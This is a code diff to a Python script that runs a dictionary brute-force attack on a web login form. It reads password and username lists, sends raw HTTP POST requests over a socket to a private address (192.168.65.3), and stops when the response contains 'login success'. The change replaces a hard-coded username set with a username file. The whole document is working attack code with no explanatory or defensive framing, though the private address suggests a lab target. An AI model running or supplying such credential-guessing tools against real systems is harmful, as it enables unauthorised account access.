@@ -1,16 +1,20 @@
 import socket
 import sys
-fname = './dictpasswd.txt'
+fname_pass = './dictpasswd.txt'
+fname_user = './usernames.txt'
 target = '<p>login success</p>'
-usernames = {'user':'', 'taro':'', 'root':''}
-f = open(fname, 'r')
-dictpasswds = f.readlines()
-f.close()
+
+f_pass = open(fname_pass, 'r')
+f_user = open(fname_user, 'r')
+dictpasswds = f_pass.readlines()
+dictusernames = f_user.readlines()
+f_pass.close()
+f_user.close()
 for dictpasswd in dictpasswds:
     passwd = dictpasswd.rstrip('\n')
-    for username in usernames.keys():
-        usernames[username] = passwd
-        print(username, usernames[username])
+    for dictusername in dictusernames:
+        username = dictusername.rstrip('\n')
+        print(username, passwd)
 
         mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         mysock.connect(('192.168.65.3', 80))
@@ -31,7 +35,7 @@ for dictpasswd in dictpasswds:
         msg = msg + 'Upgrade-Insecure-Requests: 1\r\n'
         msg = msg + 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\r\n'
         msg = msg + '\r\n'
-        msg = msg + f'title={usernames[username]}&author={username}&text=dddd\r\n'
+        msg = msg + f'title={passwd}&author={username}&text=dddd\r\n'
         cmd = msg.encode()
         mysock.send(cmd)
 
@@ -41,6 +45,6 @@ for dictpasswd in dictpasswds:
                 break
             content = data.decode()
             if target in content:
-                print("yes", username, usernames[username])
+                print("yes", username, passwd)
                 sys.exit(0)
         mysock.close()
